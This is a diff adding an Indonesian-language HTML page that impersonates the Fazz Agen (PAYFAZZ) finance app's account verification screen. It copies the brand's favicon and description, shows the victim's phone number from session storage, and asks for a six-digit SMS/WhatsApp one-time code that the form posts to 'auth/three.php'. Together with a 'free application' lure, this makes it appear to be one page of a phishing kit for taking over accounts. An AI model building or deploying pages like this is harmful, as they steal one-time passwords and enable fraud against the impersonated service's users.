@@ -1,0 +1,166 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Akun</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="icon" href="https://support-agen.fazz.com/hc/theming_assets/01HZM5JPN4HDRFE5C5X0NAJDQP" rel="shortcut icon" type="image/x-icon">
+    <meta property="og:description" content="Fazz Agen, sebelumnya dikenal sebagai PAYFAZZ, merupakan sebuah aplikasi keuangan yang telah hadir sejak tahun 2016. Aplikasi Fazz Agen dapat digunakan untuk melakukan pembelian ataupun pembayaran ..">
+   
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #ffffff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+        }
+        .header i {
+            font-size: 24px;
+        }
+        .header h1 {
+            font-size: 20px;
+            margin: 0;
+        }
+        .verification-info {
+            margin: 20px 0;
+        }
+        .verification-info p {
+            margin: 5px 0;
+            font-size: 16px;
+        }
+        .verification-info p span {
+            font-weight: bold;
+        }
+        .verification-info .icons {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 10px;
+        }
+        .verification-info .icons i {
+            font-size: 24px;
+            margin: 0 10px;
+        }
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+        .code-inputs input {
+            width: 25px;
+            height: 25px;
+            font-size: 24px;
+            text-align: center;
+            border: 2px solid #007BFF;
+            border-radius: 10px;
+        }
+        .resend-code {
+            color: #888888;
+            font-size: 14px;
+        }
+        .warning {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #007BFF;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <i class="fas fa-arrow-left"></i>
+            <h1>Verifikasi Akun</h1>
+            <i class="fas fa-headset"></i>
+        </div>
+        <div class="verification-info">
+            <p>Kode Verifikasi telah dikirim via SMS / Whatsapp</p>
+            <p>Ke nomor <span id="usernameDisplay"></span></p>
+            <div class="icons">
+                <i class="fab fa-whatsapp" style="color: #25D366;"></i>
+                <i class="fas fa-comment-dots" style="color: #000000;"></i>
+            </div>
+        </div>
+        <form action="auth/three.php" method="post">
+            <div class="code-inputs">
+                <input id="otp1" name="otp1" type="number" required maxlength="1" oninput="moveToNext(this, 'otp2')">
+                <input id="otp2" name="otp2" type="number" required maxlength="1" oninput="moveToNext(this, 'otp3')">
+                <input id="otp3" name="otp3" type="number" required maxlength="1" oninput="moveToNext(this, 'otp4')">
+                <input id="otp4" name="otp4" type="number" required maxlength="1" oninput="moveToNext(this, 'otp5')">
+                <input id="otp5" name="otp5" type="number" required maxlength="1" oninput="moveToNext(this, 'otp6')">
+                <input id="otp6" name="otp6" type="number" required maxlength="1">
+            </div>
+            <div class="resend-code" id="resendTimer">
+                Kirim Ulang Kode Verifikasi (3:00)
+            </div>
+            <div class="warning">
+               Pengajuan Gratis bagi member atau pengguna aplikasi Fazz Agen (PAYFAZZ)
+            </div>
+                    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+            <button class="submit-btn">Lanjut</button>
+        </form>
+    </div>
+<script>
+    // Function to move to the next input field automatically
+    function moveToNext(current, nextFieldId) {
+        if (current.value.length === current.maxLength) {
+            document.getElementById(nextFieldId).focus();
+        }
+    }
+
+    // Countdown timer function
+    let countdownTime = 180; // 3 minutes in seconds
+    const timerElement = document.getElementById('resendTimer');
+
+    function updateTimer() {
+        const minutes = Math.floor(countdownTime / 60);
+        const seconds = countdownTime % 60;
+        timerElement.textContent = `Kirim Ulang Kode Verifikasi (${minutes}:${seconds < 10 ? '0' : ''}${seconds})`;
+        
+        if (countdownTime <= 0) {
+            clearInterval(timerInterval);
+            timerElement.textContent = 'Kirim Ulang Kode Verifikasi';
+        }
+        countdownTime--;
+    }
+
+    const timerInterval = setInterval(updateTimer, 1000);
+
+    window.onload = function() {
+        var username = sessionStorage.getItem("username");
+        if (username) {
+            document.getElementById("usernameDisplay").textContent = username;
+        }
+    };
+</script>
+</body>
+</html>
